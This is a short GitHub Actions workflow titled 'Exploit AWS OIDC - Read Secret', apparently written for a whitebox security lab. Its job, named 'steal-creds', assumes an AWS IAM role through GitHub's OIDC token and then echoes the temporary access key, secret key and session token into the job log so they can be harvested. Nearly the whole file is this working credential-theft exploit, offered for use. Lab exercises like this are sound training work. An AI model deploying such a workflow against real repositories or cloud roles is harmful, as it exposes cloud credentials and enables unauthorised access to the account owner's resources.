name: "Exploit AWS OIDC - Read Secret"

on:
  push:
    branches:
      - main
  workflow_dispatch: # Esto te permite ejecutarlo manualmente desde la pestaña Actions

permissions:
  id-token: write
  contents: read

jobs:
  steal-creds:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::620483490609:role/whitebox-lab-2-github-actions-role
          aws-region: us-east-1

      - name: Print credentials
        run: |
          echo "=== IDENTITY ==="
          aws sts get-caller-identity
          echo "=== CREDENTIALS ==="
          echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID"
          echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"
          echo "AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN"
